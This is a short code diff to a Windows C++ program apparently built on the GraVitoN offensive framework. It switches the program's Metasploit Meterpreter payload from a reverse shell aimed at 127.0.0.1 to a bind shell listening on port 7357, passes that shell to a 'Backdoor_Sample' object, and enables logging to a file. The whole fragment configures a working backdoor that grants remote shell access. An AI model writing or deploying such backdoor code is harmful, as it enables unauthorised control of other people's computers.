@@ -30,15 +30,15 @@
 /// Activate/Deactivate GraVitoN logger
 #define GVN_ACTIVATE_LOGGER
 /// Print logs into a file
-//#define GVN_LOG_INTO_FILE
-/// Path to Log File
-//#define GVN_LOG_FILE "./graviton_logs.txt"
+#define GVN_LOG_INTO_FILE
+// Path to Log File
+#define GVN_LOG_FILE "./graviton_logs.txt"
 
 #include <windows.h>
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 #include <graviton.hpp>
-// #include <payload/win/meterpreter_bind_32.hpp>
+#include <payload/win/meterpreter_bind_32.hpp>
 #include <payload/win/meterpreter_reverse_32.hpp>
 #include <ai/backdoor_sample.hpp>
 #include <iostream>
@@ -50,10 +50,10 @@ int WINAPI WinMain(HINSTANCE h_instance, HINSTANCE h_prev_instance, LPSTR cmd_li
 {
     GraVitoN::Core::Logger::logItLn ( "main -> Started" );
 
-    // GraVitoN::Payload::Windows_MSF_Shell_Bind_32 msfpay;
-    // msfpay.initialize(7357);
-    GraVitoN::Payload::Windows_MSF_Shell_Reverse_32 msfpay;
-    msfpay.initialize("127.0.0.1", 7357);
+    GraVitoN::Payload::Windows_MSF_Shell_Bind_32 msfpay;
+    msfpay.initialize(7357);
+    // GraVitoN::Payload::Windows_MSF_Shell_Reverse_32 msfpay;
+    // msfpay.initialize("127.0.0.1", 7357);
 
     GraVitoN::AI::Backdoor_Sample backy(msfpay);
 
